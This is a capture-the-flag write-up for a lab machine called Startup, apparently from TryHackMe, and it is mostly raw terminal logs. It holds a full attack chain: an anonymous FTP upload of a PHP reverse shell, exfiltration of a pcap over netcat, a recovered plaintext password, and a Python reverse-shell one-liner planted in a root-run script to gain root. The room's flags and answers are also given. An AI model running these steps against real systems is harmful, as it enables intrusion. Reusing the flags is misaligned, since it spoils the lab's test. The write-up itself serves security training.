---
Abuse traditional vulnerabilities via untraditional means.
---

![|333](https://tryhackme-images.s3.amazonaws.com/room-icons/98d1e206f2d58494b67a1a52c0f8d244.png)

### Welcome to Spice Hut! 

We are Spice Hut, a new startup company that just made it big! We offer a variety of spices and club sandwiches (in case you get hungry), but that is not why you are here. To be truthful, we aren't sure if our developers know what they are doing and our security concerns are rising. We ask that you perform a thorough penetration test and try to own root. Good luck!

```
┌──(kali㉿kali)-[~/Downloads/hacker_vs_hacker]
└─$ nmap -sC -sV 10.10.6.231            
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-24 23:14 EDT
Stats: 0:00:41 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 75.42% done; ETC: 23:15 (0:00:13 remaining)
Stats: 0:00:41 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 75.52% done; ETC: 23:15 (0:00:13 remaining)
Stats: 0:00:42 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 76.02% done; ETC: 23:15 (0:00:13 remaining)
Stats: 0:00:42 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 76.12% done; ETC: 23:15 (0:00:13 remaining)
Nmap scan report for 10.10.6.231
Host is up (0.23s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.18.1.77
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxrwxrwx    2 65534    65534        4096 Nov 12  2020 ftp [NSE: writeable]
| -rw-r--r--    1 0        0          251631 Nov 12  2020 important.jpg
|_-rw-r--r--    1 0        0             208 Nov 12  2020 notice.txt
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b9:a6:0b:84:1d:22:01:a4:01:30:48:43:61:2b:ab:94 (RSA)
|   256 ec:13:25:8c:18:20:36:e6:ce:91:0e:16:26:eb:a2:be (ECDSA)
|_  256 a2:ff:2a:72:81:aa:a2:9f:55:a4:dc:92:23:e6:b4:3f (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Maintenance
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 77.33 seconds
zsh: segmentation fault  nmap -sC -sV 10.10.6.231

less time using -T4

┌──(kali㉿kali)-[~/Downloads/hacker_vs_hacker]
└─$ sudo nmap -sC -sV -T4 -A 10.10.6.231   
[sudo] password for kali: 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-24 23:30 EDT
Nmap scan report for 10.10.6.231
Host is up (0.23s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxrwxrwx    2 65534    65534        4096 Sep 25 03:24 ftp [NSE: writeable]
| -rw-r--r--    1 0        0          251631 Nov 12  2020 important.jpg
|_-rw-r--r--    1 0        0             208 Nov 12  2020 notice.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.18.1.77
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b9:a6:0b:84:1d:22:01:a4:01:30:48:43:61:2b:ab:94 (RSA)
|   256 ec:13:25:8c:18:20:36:e6:ce:91:0e:16:26:eb:a2:be (ECDSA)
|_  256 a2:ff:2a:72:81:aa:a2:9f:55:a4:dc:92:23:e6:b4:3f (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Maintenance
|_http-server-header: Apache/2.4.18 (Ubuntu)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=9/24%OT=21%CT=1%CU=37872%PV=Y%DS=2%DC=T%G=Y%TM=632FCB7
OS:F%P=x86_64-pc-linux-gnu)SEQ(SP=FF%GCD=1%ISR=107%TI=Z%CI=I%II=I%TS=8)SEQ(
OS:SP=FA%GCD=1%ISR=10A%TI=Z%CI=I%TS=8)OPS(O1=M506ST11NW6%O2=M506ST11NW6%O3=
OS:M506NNT11NW6%O4=M506ST11NW6%O5=M506ST11NW6%O6=M506ST11)WIN(W1=68DF%W2=68
OS:DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN(R=Y%DF=Y%T=40%W=6903%O=M506NNSNW6
OS:%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=
OS:Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%
OS:RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0
OS:%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIP
OS:CK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 1025/tcp)
HOP RTT       ADDRESS
1   225.17 ms 10.18.0.1
2   225.50 ms 10.10.6.231

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 67.28 seconds
zsh: segmentation fault  sudo nmap -sC -sV -T4 -A 10.10.6.231



┌──(kali㉿kali)-[~/Downloads/hacker_vs_hacker]
└─$ ftp 10.10.6.231                                                                                   
Connected to 10.10.6.231.
220 (vsFTPd 3.0.3)
Name (10.10.6.231:kali): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||16357|)
150 Here comes the directory listing.
drwxrwxrwx    2 65534    65534        4096 Nov 12  2020 ftp
-rw-r--r--    1 0        0          251631 Nov 12  2020 important.jpg
-rw-r--r--    1 0        0             208 Nov 12  2020 notice.txt
226 Directory send OK.
ftp> mget *
mget ftp [anpqy?]? 
229 Entering Extended Passive Mode (|||56128|)
550 Failed to open file.
mget important.jpg [anpqy?]? 
229 Entering Extended Passive Mode (|||44752|)
150 Opening BINARY mode data connection for important.jpg (251631 bytes).
100% |************************************************************|   245 KiB   60.16 KiB/s    00:00 ETA
226 Transfer complete.
251631 bytes received in 00:04 (54.70 KiB/s)
mget notice.txt [anpqy?]? 
229 Entering Extended Passive Mode (|||11485|)
150 Opening BINARY mode data connection for notice.txt (208 bytes).
100% |************************************************************|   208        2.17 MiB/s    00:00 ETA
226 Transfer complete.
208 bytes received in 00:00 (0.57 KiB/s)
ftp> cd ftp
250 Directory successfully changed.
ftp> ls
229 Entering Extended Passive Mode (|||27398|)
150 Here comes the directory listing.
226 Directory send OK.
ftp> ls -la
229 Entering Extended Passive Mode (|||51808|)
150 Here comes the directory listing.
drwxrwxrwx    2 65534    65534        4096 Nov 12  2020 .
drwxr-xr-x    3 65534    65534        4096 Nov 12  2020 ..
226 Directory send OK.
ftp> exit
221 Goodbye.

┌──(kali㉿kali)-[~/Downloads/hacker_vs_hacker]
└─$ cat notice.txt 
Whoever is leaving these damn Among Us memes in this share, it IS NOT FUNNY. People downloading documents from our website will think we are a joke! Now I dont know who it is, but Maya is looking pretty sus.

┌──(kali㉿kali)-[~/Downloads/hacker_vs_hacker]
└─$ feroxbuster --url http://10.10.6.231 -w /usr/share/wordlists/dirb/common.txt -t 60 -C 404,403

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.7.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.6.231
 🚀  Threads               │ 60
 📖  Wordlist              │ /usr/share/wordlists/dirb/common.txt
 💢  Status Code Filters   │ [404, 403]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.7.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET       20l      113w      808c http://10.10.6.231/
301      GET        9l       28w      310c http://10.10.6.231/files => http://10.10.6.231/files/


uploading revshell.php

┌──(kali㉿kali)-[~/Downloads/hacker_vs_hacker]
└─$ ftp 10.10.6.231
Connected to 10.10.6.231.
220 (vsFTPd 3.0.3)
Name (10.10.6.231:kali): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> cd ftp
250 Directory successfully changed.
ftp> put shell.php5
local: shell.php5 remote: shell.php5
229 Entering Extended Passive Mode (|||19321|)
150 Ok to send data.
100% |************************************************************|  5489      783.10 KiB/s    00:00 ETA
226 Transfer complete.
5489 bytes sent in 00:00 (6.54 KiB/s)
ftp> exit
221 Goodbye.

http://10.10.6.231/files/ftp/

┌──(kali㉿kali)-[~]
└─$ rlwrap nc -nlvp 4444
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.10.6.231.
Ncat: Connection from 10.10.6.231:59268.
Linux startup 4.4.0-190-generic #220-Ubuntu SMP Fri Aug 28 23:02:15 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 03:25:36 up 14 min,  0 users,  load average: 0.01, 0.17, 0.26
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ python3 -c "import pty;pty.spawn('/bin/bash')"
www-data@startup:/$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@startup:/$ ls
ls
bin   home            lib         mnt         root  srv  vagrant
boot  incidents       lib64       opt         run   sys  var
dev   initrd.img      lost+found  proc        sbin  tmp  vmlinuz
etc   initrd.img.old  media       recipe.txt  snap  usr  vmlinuz.old
www-data@startup:/$ cat recipe.txt
cat recipe.txt
Someone asked what our main ingredient to our spice soup is today. I figured I can't keep it a secret forever and told him it was love.

gtting file to see in wireshark

www-data@startup:/$ cd incidents
cd incidents
www-data@startup:/incidents$ ls
ls
suspicious.pcapng
www-data@startup:/incidents$ nc 10.18.1.77 1337 < suspicious.pcapng
nc 10.18.1.77 1337 < suspicious.pcapng

┌──(kali㉿kali)-[~]
└─$ rlwrap nc -nlvp 1337 > suspicious.pcapng
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::1337
Ncat: Listening on 0.0.0.0:1337
Ncat: Connection from 10.10.6.231.
Ncat: Connection from 10.10.6.231:35890.
                                                                                                         
┌──(kali㉿kali)-[~]
└─$ ls
armitage-tmp  cred_harv   Downloads        obfus           sam.bak          Sublist3r
asm           crunch.txt  ftp_flag.txt     payloads        sandox_learning  suspicious.pcapng
book.txt      Desktop     hashctf2         Pictures        share            system.bak
chill_hack    dict2.lst   IDS_IPS_evasion  powercat        shell.php        Templates
clinic.lst    dict.lst    multi_launcher   PowerLessShell  snmpcheck        usernames-list.txt
confidential  Documents   Music            Public          stager2.bat      Videos
                                                                                                         
┌──(kali㉿kali)-[~]
└─$ file suspicious.pcapng
suspicious.pcapng: pcapng capture file - version 1.0

open with wireshark follow tcp  stream 7


Linux startup 4.4.0-190-generic #220-Ubuntu SMP Fri Aug 28 23:02:15 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 17:40:21 up 20 min,  1 user,  load average: 0.00, 0.03, 0.12
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
vagrant  pts/0    10.0.2.2         17:21    1:09   0.54s  0.54s -bash
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ ls
bin
boot
data
dev
etc
home
incidents
initrd.img
initrd.img.old
lib
lib64
lost+found
media
mnt
opt
proc
recipe.txt
root
run
sbin
snap
srv
sys
tmp
usr
vagrant
var
vmlinuz
vmlinuz.old
$ ls -la
total 96
drwxr-xr-x  26 root     root      4096 Oct  2 17:24 .
drwxr-xr-x  26 root     root      4096 Oct  2 17:24 ..
drwxr-xr-x   2 root     root      4096 Sep 25 08:12 bin
drwxr-xr-x   3 root     root      4096 Sep 25 08:12 boot
drwxr-xr-x   1 vagrant  vagrant    140 Oct  2 17:24 data
drwxr-xr-x  16 root     root      3620 Oct  2 17:20 dev
drwxr-xr-x  95 root     root      4096 Oct  2 17:24 etc
drwxr-xr-x   4 root     root      4096 Oct  2 17:26 home
drwxr-xr-x   2 www-data www-data  4096 Oct  2 17:24 incidents
lrwxrwxrwx   1 root     root        33 Sep 25 08:12 initrd.img -> boot/initrd.img-4.4.0-190-generic
lrwxrwxrwx   1 root     root        33 Sep 25 08:12 initrd.img.old -> boot/initrd.img-4.4.0-190-generic
drwxr-xr-x  22 root     root      4096 Sep 25 08:22 lib
drwxr-xr-x   2 root     root      4096 Sep 25 08:10 lib64
drwx------   2 root     root     16384 Sep 25 08:12 lost+found
drwxr-xr-x   2 root     root      4096 Sep 25 08:09 media
drwxr-xr-x   2 root     root      4096 Sep 25 08:09 mnt
drwxr-xr-x   2 root     root      4096 Sep 25 08:09 opt
dr-xr-xr-x 125 root     root         0 Oct  2 17:19 proc
-rw-r--r--   1 www-data www-data   136 Oct  2 17:24 recipe.txt
drwx------   3 root     root      4096 Oct  2 17:24 root
drwxr-xr-x  25 root     root       960 Oct  2 17:23 run
drwxr-xr-x   2 root     root      4096 Sep 25 08:22 sbin
drwxr-xr-x   2 root     root      4096 Oct  2 17:20 snap
drwxr-xr-x   3 root     root      4096 Oct  2 17:23 srv
dr-xr-xr-x  13 root     root         0 Oct  2 17:19 sys
drwxrwxrwt   7 root     root      4096 Oct  2 17:40 tmp
drwxr-xr-x  10 root     root      4096 Sep 25 08:09 usr
drwxr-xr-x   1 vagrant  vagrant    118 Oct  1 19:49 vagrant
drwxr-xr-x  14 root     root      4096 Oct  2 17:23 var
lrwxrwxrwx   1 root     root        30 Sep 25 08:12 vmlinuz -> boot/vmlinuz-4.4.0-190-generic
lrwxrwxrwx   1 root     root        30 Sep 25 08:12 vmlinuz.old -> boot/vmlinuz-4.4.0-190-generic
$ whoami
www-data
$ python -c "import pty;pty.spawn('/bin/bash')"
www-data@startup:/$ cd
cd
bash: cd: HOME not set
www-data@startup:/$ ls
ls
bin   etc	  initrd.img.old  media  recipe.txt  snap  usr	    vmlinuz.old
boot  home	  lib		  mnt	 root	     srv   vagrant
data  incidents   lib64		  opt	 run	     sys   var
dev   initrd.img  lost+found	  proc	 sbin	     tmp   vmlinuz
www-data@startup:/$ cd home
cd home
www-data@startup:/home$ cd lennie
cd lennie
bash: cd: lennie: Permission denied
www-data@startup:/home$ ls
ls
lennie
www-data@startup:/home$ cd lennie
cd lennie
bash: cd: lennie: Permission denied
www-data@startup:/home$ sudo -l
sudo -l
[sudo] password for www-data: c4ntg3t3n0ughsp1c3

Sorry, try again.
[sudo] password for www-data: 

Sorry, try again.
[sudo] password for www-data: c4ntg3t3n0ughsp1c3

sudo: 3 incorrect password attempts
www-data@startup:/home$ cat /etc/passwd
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
lxd:x:106:65534::/var/lib/lxd/:/bin/false
messagebus:x:107:111::/var/run/dbus:/bin/false
uuidd:x:108:112::/run/uuidd:/bin/false
dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false
sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin
pollinate:x:111:1::/var/cache/pollinate:/bin/false
vagrant:x:1000:1000:,,,:/home/vagrant:/bin/bash
ftp:x:112:118:ftp daemon,,,:/srv/ftp:/bin/false
lennie:x:1002:1002::/home/lennie:
ftpsecure:x:1003:1003::/home/ftpsecure:
www-data@startup:/home$ exit
exit
exit
$ exit

ssh

lennie:c4ntg3t3n0ughsp1c3


www-data@startup:/incidents$ su lennie
su lennie
Password: c4ntg3t3n0ughsp1c3

lennie@startup:/incidents$ cd /home/lennie
cd /home/lennie
lennie@startup:~$ ls
ls
Documents  scripts  user.txt
lennie@startup:~$ cat user.txt
cat user.txt
THM{03ce3d619b80ccbfb3b7fc81e46c0e79}

priv esc

lennie@startup:~$ sudo -l
sudo -l
sudo: unable to resolve host startup
[sudo] password for lennie: c4ntg3t3n0ughsp1c3

Sorry, user lennie may not run sudo on startup.
lennie@startup:~$ cd scripts
cd scripts
lennie@startup:~/scripts$ ls
ls
planner.sh  startup_list.txt
lennie@startup:~/scripts$ cat planner.sh
cat planner.sh
#!/bin/bash
echo $LIST > /home/lennie/scripts/startup_list.txt
/etc/print.sh

lennie@startup:~/scripts$ cat startup_list.txt
cat startup_list.txt

lennie@startup:~/scripts$ cat /etc/print.sh
cat /etc/print.sh
#!/bin/bash
echo "Done!"


lennie@startup:~/scripts$ cat > /etc/print.sh << EOF
cat > /etc/print.sh << EOF
> #!/bin/bash
#!/bin/bash
> python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("10.18.1.77",1337));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")'
<37));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")'         
> EOF
EOF


┌──(kali㉿kali)-[~]
└─$ rlwrap nc -nlvp 1337                    
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::1337
Ncat: Listening on 0.0.0.0:1337
Ncat: Connection from 10.10.6.231.
Ncat: Connection from 10.10.6.231:35904.
root@startup:~# cat /root/root.txt
cat /root/root.txt
THM{f963aaa6a430f210222158ae15c3d76d}
root@startup:~# 







```

![[Pasted image 20220924224724.png]]

![[Pasted image 20220924224837.png]]


What is the secret spicy soup recipe?
FTP and HTTP. What could possibly go wrong?
*love*



What are the contents of user.txt?
 Something doesn't belong.
*THM{03ce3d619b80ccbfb3b7fc81e46c0e79}*




What are the contents of root.txt?
Scripts...
*THM{f963aaa6a430f210222158ae15c3d76d}*




[[Tech_Supp0rt 1]]